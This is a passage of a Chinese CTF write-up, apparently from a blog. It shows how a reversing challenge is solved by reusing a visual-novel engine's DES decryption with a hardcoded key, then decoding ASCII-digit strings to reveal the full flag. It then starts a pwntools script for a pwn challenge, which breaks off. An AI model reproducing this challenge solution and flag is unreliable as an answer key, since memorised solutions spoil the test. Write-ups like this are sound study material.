class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Yuri.YuriInterpreter</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> 加密解密类</span></span><br><span class="line">    <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title">YuriEncryptor</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> 对一个字符串做DES加密</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name=&quot;data&quot;&gt;</span>要加密的数据<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name=&quot;key&quot;&gt;</span>私钥<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span>加密完毕的字符串<span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">EncryptString</span>(<span class="params"><span class="built_in">string</span> data, <span class="built_in">string</span> key</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> str = <span class="built_in">string</span>.Empty;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">string</span>.IsNullOrEmpty(data))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> str;</span><br><span class="line">            &#125;</span><br><span class="line">            MemoryStream ms = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">            <span class="built_in">byte</span>[] myKey = Encoding.UTF8.GetBytes(key);</span><br><span class="line">            <span class="built_in">byte</span>[] myIV = &#123; <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x56</span>, <span class="number">0x78</span>, <span class="number">0x90</span>, <span class="number">0xAB</span>, <span class="number">0xCD</span>, <span class="number">0xEF</span> &#125;;</span><br><span class="line">            DES myProvider = <span class="keyword">new</span> DESCryptoServiceProvider();</span><br><span class="line">            CryptoStream cs = <span class="keyword">new</span> CryptoStream(ms, myProvider.CreateEncryptor(myKey, myIV), CryptoStreamMode.Write);</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">byte</span>[] bs = Encoding.UTF8.GetBytes(data);</span><br><span class="line">                cs.Write(bs, <span class="number">0</span>, bs.Length);</span><br><span class="line">                cs.FlushFinalBlock();</span><br><span class="line">                str = Convert.ToBase64String(ms.ToArray());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">finally</span></span><br><span class="line">            &#123;</span><br><span class="line">                cs.Close();</span><br><span class="line">                ms.Close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> str;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> 对一个字符串做DES解密</span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name=&quot;data&quot;&gt;</span>要解密的数据<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;param name=&quot;key&quot;&gt;</span>私钥<span class="doctag">&lt;/param&gt;</span></span></span><br><span class="line">        <span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;returns&gt;</span>解密完毕的字符串<span class="doctag">&lt;/returns&gt;</span></span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">DecryptString</span>(<span class="params"><span class="built_in">string</span> data, <span class="built_in">string</span> key</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">string</span> str = <span class="built_in">string</span>.Empty;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">string</span>.IsNullOrEmpty(data))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">&quot;data is empty&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            MemoryStream ms = <span class="keyword">new</span> MemoryStream();</span><br><span class="line">            <span class="built_in">byte</span>[] myKey = Encoding.UTF8.GetBytes(key);</span><br><span class="line">            <span class="built_in">byte</span>[] myIV = &#123; <span class="number">0x12</span>, <span class="number">0x34</span>, <span class="number">0x56</span>, <span class="number">0x78</span>, <span class="number">0x90</span>, <span class="number">0xAB</span>, <span class="number">0xCD</span>, <span class="number">0xEF</span> &#125;;</span><br><span class="line">            DES myProvider = <span class="keyword">new</span> DESCryptoServiceProvider();</span><br><span class="line">            CryptoStream cs = <span class="keyword">new</span> CryptoStream(ms, myProvider.CreateDecryptor(myKey, myIV), CryptoStreamMode.Write);</span><br><span class="line">            <span class="keyword">try</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">byte</span>[] bs = Convert.FromBase64String(data);</span><br><span class="line">                cs.Write(bs, <span class="number">0</span>, bs.Length);</span><br><span class="line">                cs.FlushFinalBlock();</span><br><span class="line">                str = Encoding.UTF8.GetString(ms.ToArray());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">finally</span></span><br><span class="line">            &#123;</span><br><span class="line">                cs.Close();</span><br><span class="line">                ms.Close();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> str;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个是des加密的，下面还有解密函数，就在窗口load那调用了一下</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">CPMainForm_Load</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    String path = <span class="string">&quot;D:\\dw_file\\cnss\\CNSS Rev Challenge\\Scenario\\main.sil&quot;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="built_in">string</span> encryptedData <span class="keyword">in</span> File.ReadLines(path))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">string</span> key = <span class="string">&quot;yurayuri&quot;</span>;</span><br><span class="line">        <span class="built_in">string</span> decryptedData = YuriEncryptor.DecryptString(encryptedData, key);</span><br><span class="line">        Console.WriteLine(decryptedData);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>解密出来的文本是这样的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">main_0@NOP^^^^main_0@act_bgm#main_1@act_bg#main_2@act_se#main_4@act_dialog#main_6@act_cstand#main_7@act_se#main_9@act_dialog#main_11@act_deletecstand#main_12@act_se#main_14@act_dialog#main_16@act_se#main_18@act_dialog#main_20@act_stopbgm#main_21@act_cstand#main_22@act_se#main_24@act_dialog#main_26@act_bgm#main_27@act_se#main_29@act_dialog#main_31@act_se#main_33@act_dialog#main_35@act_se#main_37@act_dialog#main_39@act_deletecstand#main_40@act_bg#main_41@act_se#main_43@act_dialog#main_45@act_se#main_47@act_dialog#main_49@act_se#main_51@act_dialog#main_53@act_se#main_55@act_dialog#main_57@act_se#main_59@act_dialog#main_61@act_se#main_63@act_dialog#main_65@act_se#main_66@act_bg#main_67@act_wait#main_68@act_bg#main_69@act_cstand#main_71@act_dialog#main_73@act_deletecstand#main_74@act_se#main_75@act_bg#main_76@act_wait#main_77@act_se#main_78@act_bg#main_79@act_wait#main_80@act_bg#main_81@act_stopbgm#main_82@act_cstand#main_83@act_se#main_85@act_dialog#main_87@act_bg#main_88@act_bgm#main_89@act_deletecstand#main_90@act_cstand#main_91@act_se#main_93@act_dialog#main_95@act_se#main_97@act_dialog#main_99@act_se#main_101@act_dialog#main_103@act_se#main_105@act_dialog#main_107@act_se#main_109@act_dialog#main_111@act_se#main_113@act_dialog#main_115@act_se#main_117@act_dialog#main_119@act_se#main_121@act_dialog#main_123@act_se#main_125@act_dialog#main_127@act_se#main_129@act_dialog#main_131@act_deletecstand#main_132@act_picture#main_133@act_se#main_135@act_dialog#main_137@act_se#main_139@act_dialog#main_142@act_dialog#main_144@act_deletepicture#main_145@act_se#main_147@act_dialog#main_150@act_dialog#main_152@act_shutdown^^0^^109097105110</span><br><span class="line">main_0@act_bgm^filename@050053046109112051#vol@052057056^^main_1@act_bg^^^0^^048045048</span><br><span class="line">main_1@act_bg^id@049#filename@100111111114046106112103#x@#y@#opacity@#xscale@#yscale@#ro@045050053^^main_2@act_se^^^0^^049045048</span><br><span class="line">main_2@act_se^filename@121117107117109111095048048048049046109112051#vol@056048048^^main_4@act_dialog^^^0^^050045048</span><br><span class="line">main_4@act_dialog^^^main_6@act_cstand^^^0^^083104105110111058227128142230136145229143171032083104105110111239188140230152175228184128229144141229136154229136154229133165229173166231148181229173144231165158230138128229164167229173166231154132232174161231174151230156186229176143231153189227128130227128143013010035048</span><br><span class="line">main_6@act_cstand^id@048#name@083104105110111#face@049#x@049051048#y@049051048#loc@^^main_7@act_se^^^0^^054045048</span><br><span class="line">main_7@act_se^filename@121117107117109111095048048048050046109112051#vol@056048048^^main_9@act_dialog^^^0^^055045048</span><br><span class="line">main_9@act_dialog^^^main_11@act_deletecstand^^^0^^083104105110111058032227128142232191153230152175230136145239188140233149191231155184232141137231142135239188140228189134229175140230156137231165158231167152230132159227128130227128143013010035048</span><br><span class="line">main_11@act_deletecstand^id@048^^main_12@act_se^^^0^^049049045048</span><br><span class="line">main_12@act_se^filename@121117107117109111095048048048051046109112051#vol@056048048^^main_14@act_dialog^^^0^^049050045048</span><br><span class="line">main_14@act_dialog^^^main_16@act_se^^^0^^083104105110111058032227128142231142176229156168230136145230173163231171153229156168230160161233151168229143163227128130228187164228186186229144145229190128231154132229164167229173166231148159230180187230136145230157165229149166239188129227128143013010035048</span><br><span class="line">main_16@act_se^filename@121117107117109111095048048048052046109112051#vol@056048048^^main_18@act_dialog^^^0^^049054045048</span><br><span class="line">main_18@act_dialog^^^main_20@act_stopbgm^^^0^^083104105110111058032227128142231173137231173137239188140233130163230152175228187128228185136239188159227128143013010035048</span><br><span class="line">main_20@act_stopbgm^^^main_21@act_cstand^^^0^^050048045048</span><br><span class="line">main_21@act_cstand^id@049#name@083104105110111#face@050#x@049051048#y@049051048#loc@^^main_22@act_se^^^0^^050049045048</span><br><span class="line">main_22@act_se^filename@121117107117109111095048048048053046109112051#vol@056048048^^main_24@act_dialog^^^0^^050050045048</span><br><span class="line">main_24@act_dialog^^^main_26@act_bgm^^^0^^083104105110111058032227128142231156139232181183230157165230156137231130185229131143046046046046230136145232135170229183177239188159227128143013010035048</span><br><span class="line">main_26@act_bgm^filename@050057046109112051#vol@053048050^^main_27@act_se^^^0^^050054045048</span><br><span class="line">main_27@act_se^filename@121117107117109111095048048048054046109112051#vol@056048048^^main_29@act_dialog^^^0^^050055045048</span><br><span class="line">main_29@act_dialog^^^main_31@act_se^^^0^^239188159239188159239188159239188154227128142229141131228184135232166129229176143229191131046046046227128143013010035048</span><br><span class="line">main_31@act_se^filename@121117107117109111095048048048055046109112051#vol@056048048^^main_33@act_dialog^^^0^^051049045048</span><br><span class="line">main_33@act_dialog^^^main_35@act_se^^^0^^239188159239188159239188159239188154227128142232191155229133165230160161229155173229144142239188140229143175232131189228188154230156137228184128228184170229165135230128170231154132229165179228186186230137190228184138228189160227128130227128143013010035048</span><br><span class="line">main_35@act_se^filename@121117107117109111095048048048056046109112051#vol@056048048^^main_37@act_dialog^^^0^^051053045048</span><br><span class="line">main_37@act_dialog^^^main_39@act_deletecstand^^^0^^239188159239188159239188159239188154227128142229165185230136180231157128231187191232137178229184189229173144239188140228184128229164180231153189229143145227128130232153189231132182231156139232181183230157165229190136229143175231136177239188140228189134229133182229174158232131140229144142230156137228184128228184170229188186229164167231154132231165158231167152231187132231187135227128130227128143013010035048</span><br><span class="line">main_39@act_deletecstand^id@048^^main_40@act_bg^^^0^^051057045048</span><br><span class="line">main_40@act_bg^id@049#filename@067078083083046112110103#x@#y@#opacity@#xscale@#yscale@#ro@045050053^^main_41@act_se^^^0^^052048045048</span><br><span class="line">main_41@act_se^filename@121117107117109111095048048048057046109112051#vol@056048048^^main_43@act_dialog^^^0^^052049045048</span><br><span class="line">main_43@act_dialog^^^main_45@act_se^^^0^^239188159239188159239188159239188154227128142229144172232175180230142165232167166228186134232191153228184170231165158231167152231187132231187135231154132228186186239188140233131189230151160228184128228190139229164150229156176232142183229190151228186134229188186229164167231154132229138155233135143227128130227128143013010035048</span><br><span class="line">main_45@act_se^filename@121117107117109111095048048049048046109112051#vol@056048048^^main_47@act_dialog^^^0^^052053045048</span><br><span class="line">main_47@act_dialog^^^main_49@act_se^^^0^^239188159239188159239188159239188154227128142230184151233128143230181139232175149227128129232189175228187182231160180232167163227128129229188128229143145232191144231187180046046046230149176228184141230184133231154132233171152231171175231165158231167152230138128230156175229156168232191153228184170231187132231187135233135140228187163228187163231155184228188160227128130227128143013010035048</span><br><span class="line">main_49@act_se^filename@121117107117109111095048048049049046109112051#vol@056048048^^main_51@act_dialog^^^0^^052057045048</span><br><span class="line">main_51@act_dialog^^^main_53@act_se^^^0^^239188159239188159239188159239188154227128142229144132231167141229165150233161185229165150233135145227128129228191157231160148229138160229136134227128129229164167229142130111102102101114239188140229133168233131189232162171232191153228184170231187132231187135231154132228186186230143161229156168230137139228184173227128130227128143013010035048</span><br><span class="line">main_53@act_se^filename@121117107117109111095048048049050046109112051#vol@056048048^^main_55@act_dialog^^^0^^053051045048</span><br><span class="line">main_55@act_dialog^^^main_57@act_se^^^0^^239188159239188159239188159239188154227128142229144172232175180228187150228187172232191152228188154231187143229184184228184190229138158228184128231167141231165158231167152228187170229188143239188140228184128231190164228186186229155180229156168229165182232140182229186151230151129232190185231148168228184141231159165233129147229147170233135140230157165231154132229164167233135143231187143232180185229164167229150157231137185229150157227128130227128143013010035048</span><br><span class="line">main_57@act_se^filename@121117107117109111095048048049051046109112051#vol@056048048^^main_59@act_dialog^^^0^^053055045048</span><br><span class="line">main_59@act_dialog^^^main_61@act_se^^^0^^239188159239188159239188159239188154227128142233130163228184170229165179228186186232191152228188154230139191230137128232176147032102108097103032230157165232175177230131145228189160227128130230136145229183178231187143229129183229129183230139191229136176228186134233130163228184170228184156232165191227128130227128143013010035048</span><br><span class="line">main_61@act_se^filename@121117107117109111095048048049052046109112051#vol@056048048^^main_63@act_dialog^^^0^^054049045048</span><br><span class="line">main_63@act_dialog^^^main_65@act_se^^^0^^239188159239188159239188159239188154227128142230136145232191153229176177230138138229174131229145138232175137228189160239188140229141131228184135228184141232166129231157128228186134229165185231154132233129147239188129227128143013010035048</span><br><span class="line">main_65@act_se^filename@121117107117109111095048048049053046109112051#vol@056048048^^main_66@act_bg^^^0^^054053045048</span><br><span class="line">main_66@act_bg^id@049#filename@099111110118101114049046112110103#x@#y@#opacity@#xscale@#yscale@#ro@045051048^^main_67@act_wait^^^0^^054054045048</span><br><span class="line">main_67@act_wait^time@051048048048^^main_68@act_bg^^^0^^054055045048</span><br><span class="line">main_68@act_bg^id@049#filename@100111111114046106112103#x@#y@#opacity@#xscale@#yscale@#ro@045050053^^main_69@act_cstand^^^0^^054056045048</span><br><span class="line">main_69@act_cstand^id@049#name@083104105110111#face@050#x@049051048#y@049051048#loc@^^main_71@act_dialog^^^0^^054057045048</span><br><span class="line">main_71@act_dialog^^^main_73@act_deletecstand^^^0^^239188129239188129013010035048</span><br><span class="line">main_73@act_deletecstand^id@048^^main_74@act_se^^^0^^055051045048</span><br><span class="line">main_74@act_se^filename@121117107117109111095048048049054046109112051#vol@056048048^^main_75@act_bg^^^0^^055052045048</span><br><span class="line">main_75@act_bg^id@049#filename@099111110118101114050046112110103#x@#y@#opacity@#xscale@#yscale@#ro@045051048^^main_76@act_wait^^^0^^055053045048</span><br><span class="line">main_76@act_wait^time@051048048048^^main_77@act_se^^^0^^055054045048</span><br><span class="line">main_77@act_se^filename@121117107117109111095048048049055046109112051#vol@056048048^^main_78@act_bg^^^0^^055055045048</span><br><span class="line">main_78@act_bg^id@049#filename@079110108121067078083083046112110103#x@#y@#opacity@#xscale@#yscale@#ro@045051048^^main_79@act_wait^^^0^^055056045048</span><br><span class="line">main_79@act_wait^time@049053048048048^^main_80@act_bg^^^0^^055057045048</span><br><span class="line">main_80@act_bg^id@049#filename@098108097110107046112110103#x@#y@#opacity@#xscale@#yscale@#ro@045051048^^main_81@act_stopbgm^^^0^^056048045048</span><br><span class="line">main_81@act_stopbgm^^^main_82@act_cstand^^^0^^056049045048</span><br><span class="line">main_82@act_cstand^id@048#name@083104105110111#face@051#x@049051048#y@049051048#loc@^^main_83@act_se^^^0^^056050045048</span><br><span class="line">main_83@act_se^filename@121117107117109111095048048049056046109112051#vol@056048048^^main_85@act_dialog^^^0^^056051045048</span><br><span class="line">main_85@act_dialog^^^main_87@act_bg^^^0^^083104105110111058227128142231165158226128148226128148231167152226128148226128148228186186226128148226128148227128143013010035048</span><br><span class="line">main_87@act_bg^id@049#filename@100111111114046106112103#x@#y@#opacity@#xscale@#yscale@#ro@045050053^^main_88@act_bgm^^^0^^056055045048</span><br><span class="line">main_88@act_bgm^filename@050053046109112051#vol@052057056^^main_89@act_deletecstand^^^0^^056056045048</span><br><span class="line">main_89@act_deletecstand^id@048^^main_90@act_cstand^^^0^^056057045048</span><br><span class="line">main_90@act_cstand^id@048#name@067078083083#face@049#x@049051048#y@049051048#loc@^^main_91@act_se^^^0^^057048045048</span><br><span class="line">main_91@act_se^filename@121117107117109111095048048049057046109112051#vol@056048048^^main_93@act_dialog^^^0^^057049045048</span><br><span class="line">main_93@act_dialog^^^main_95@act_se^^^0^^229143175231136177231154132229165179229173169058227128142228184141229143175228187165229144172228187150231158142232175180229147166227128130227128143013010035048</span><br><span class="line">main_95@act_se^filename@121117107117109111095048048050048046109112051#vol@056048048^^main_97@act_dialog^^^0^^057053045048</span><br><span class="line">main_97@act_dialog^^^main_99@act_se^^^0^^083104105110111058227128142231187191232137178229184189229173144239188140228184128229164180231153189229143145239188140231156139232181183230157165229190136229143175231136177046046046046046033033033033227128143013010035048</span><br><span class="line">main_99@act_se^filename@121117107117109111095048048050049046109112051#vol@056048048^^main_101@act_dialog^^^0^^057057045048</span><br><span class="line">main_101@act_dialog^^^main_103@act_se^^^0^^083104105110111058227128142233154190233129147228189160229176177230152175226128148226128148227128143013010035048</span><br><span class="line">main_103@act_se^filename@121117107117109111095048048050050046109112051#vol@056048048^^main_105@act_dialog^^^0^^049048051045048</span><br><span class="line">main_105@act_dialog^^^main_107@act_se^^^0^^083104105110111058227128142228184150231149140231172172228184128229143175231136177231154132032067078083083032229168152239188129227128143013010035048</span><br><span class="line">main_107@act_se^filename@121117107117109111095048048050052046109112051#vol@056048048^^main_109@act_dialog^^^0^^049048055045048</span><br><span class="line">main_109@act_dialog^^^main_111@act_se^^^0^^229143175231136177231154132229165179229173169058227128142230152175231154132239188140230136145229176177230152175032067078083083032229168152229147166227128130227128143013010035048</span><br><span class="line">main_111@act_se^filename@121117107117109111095048048050053046109112051#vol@056048048^^main_113@act_dialog^^^0^^049049049045048</span><br><span class="line">main_113@act_dialog^^^main_115@act_se^^^0^^067078083083032229168152058227128142230136145228187172229135157232129154231189145231187156229174137229133168229183165228189156229174164230172162232191142230175143228184128228189141229175185231189145231187156229174137229133168230136150229188128229143145232191144231187180230132159229133180232182163231154132230150176231148159229138155233135143229138160229133165239188129227128143013010035048</span><br><span class="line">main_115@act_se^filename@121117107117109111095048048050054046109112051#vol@056048048^^main_117@act_dialog^^^0^^049049053045048</span><br><span class="line">main_117@act_dialog^^^main_119@act_se^^^0^^067078083083032229168152058227128142229185182228184141230152175228187128228185136229143175230128149231154132233130170230149153231187132231187135229147166239188129227128143013010035048</span><br><span class="line">main_119@act_se^filename@121117107117109111095048048050055046109112051#vol@056048048^^main_121@act_dialog^^^0^^049049057045048</span><br><span class="line">main_121@act_dialog^^^main_123@act_se^^^0^^067078083083032229168152058227128142232175180228186134232191153228185136229164154239188140229133182229174158228189160230160185230156172228184141229156168230132143230136145228187172229134153228186134228187128228185136229137167230156172239188140228189160229133179229191131231154132229143170230156137032102108097103032229175185229144167239188129227128143013010035048</span><br><span class="line">main_123@act_se^filename@121117107117109111095048048050056046109112051#vol@056048048^^main_125@act_dialog^^^0^^049050051045048</span><br><span class="line">main_125@act_dialog^^^main_127@act_se^^^0^^067078083083032229168152058227128142230136145232191153229176177229145138232175137228189160229147166239188129227128143013010035048</span><br><span class="line">main_127@act_se^filename@121117107117109111095048048050057046109112051#vol@056048048^^main_129@act_dialog^^^0^^049050055045048</span><br><span class="line">main_129@act_dialog^^^main_131@act_deletecstand^^^0^^083104105110111058227128142229165185230173163229156168230130132230130132230139137232191145229146140230136145231154132232183157231166187046046046229165189231180167229188160239188129227128143013010035048</span><br><span class="line">main_131@act_deletecstand^id@048^^main_132@act_picture^^^0^^049051049045048</span><br><span class="line">main_132@act_picture^id@048#filename@067078083083095112110103046112110103#x@053048048#y@051048048#opacity@049#xscale@049046051#yscale@049046051#ro@048^^main_133@act_se^^^0^^049051050045048</span><br><span class="line">main_133@act_se^filename@121117107117109111095048048051048046109112051#vol@056048048^^main_135@act_dialog^^^0^^049051051045048</span><br><span class="line">main_135@act_dialog^^^main_137@act_se^^^0^^083104105110111058227128142230157165229136176229175185232175157230161134229137141233157162228186134239188129227128143013010035048</span><br><span class="line">main_137@act_se^filename@121117107117109111095048048051049046109112051#vol@056048048^^main_139@act_dialog^^^0^^049051055045048</span><br><span class="line">main_139@act_dialog^^^main_142@act_dialog^^^0^^067078083083032229168152058227128142102108097103229176177230152175226128148226128148239188129102108097103230152175099110115115123087048119033089048117095052114101095075049110103095048102095082051086051051115051051095033033033033033033125229147166239188129232174176228189143228186134229144151239188159227128143013010035049</span><br><span class="line">main_142@act_dialog^^^main_144@act_deletepicture^^^0^^067078083083032229168152058227128142229191171229142187230143144228186164229144167239188129227128143013010035048</span><br><span class="line">main_144@act_deletepicture^id@048^^main_145@act_se^^^0^^049052052045048</span><br><span class="line">main_145@act_se^filename@121117107117109111095048048051050046109112051#vol@056048048^^main_147@act_dialog^^^0^^049052053045048</span><br><span class="line">main_147@act_dialog^^^main_150@act_dialog^^^0^^083104105110111058227128142046046046046231173137231173137239188140229165185232175180228186134229149165239188159227128143013010035049</span><br><span class="line">main_150@act_dialog^^^main_152@act_shutdown^^^0^^045045084072069032069078068045045013010035048</span><br><span class="line">main_152@act_shutdown^^^^^^0^^049053050045048</span><br><span class="line">main_155@act_function^sign@114099108105099107040041^^^main_157@act_endfunction^^1^^049053053045048</span><br><span class="line">main_157@act_endfunction^^^^^^0^^049053055045048</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后去官方的技术文档那搜索了一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">符号“@”表示当前行是可执行命令，Action是命令名称，ParameterName是命令参数的名字，ParameterValueExpression是要赋值给等号左侧参数的表达式，省略号表示一个命令既可以没有&lt;参数, 值&gt;对，也可以有多个&lt;参数, 值&gt;对。注意到，一个命令如果带有多个参数时，参数是没有先后顺序要求的；而符号“#”表明当前行是注释，编译器在做语法分析时将略过它；推导符号Dialog代表在游戏执行过程中要显示的文本，这是AVG游戏使用频率最高的命令，由于文本的显示存在跨行的情况，因此它以一种上下文有关文法来表示</span><br></pre></td></tr></table></figure>

<p>Dialog是文本框相关的，然后这些数字也有规律三个一组的像ascii码一样的，然后尝试搜cnss{的ascii码099110115115123搜到了，把后面的字符串拷贝下来然后python三个三个读拿到flag cnss{W0w!Y0u_4re_K1ng_0f_R3V33s33_!!!!!!}</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;099110115115123087048119033089048117095052114101095075049110103095048102095082051086051051115051051095033033033033033033125229147166239188129232174176228189143228186134229144151239188159227128143013010035049&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(s),<span class="number">3</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(s[i:i+<span class="number">3</span>])),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>

<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="🎮-nc，启动"><a href="#🎮-nc，启动" class="headerlink" title="🎮 nc，启动"></a>🎮 nc，启动</h2><p>nc连</p>
<h2 id="😡-让我访问！！！"><a href="#😡-让我访问！！！" class="headerlink" title="😡 让我访问！！！"></a>😡 让我访问！！！</h2><p>pwntools</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">host,port = <span class="string">&quot;43.156.14.141&quot;</span>,<span class="number">1141</span></span><br><span class="line">p = remote(host,port)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&quot;(y/n)\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;y&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;(y/n)\n&quot;</span>)</span><br><span class="line">p.sendline(<span 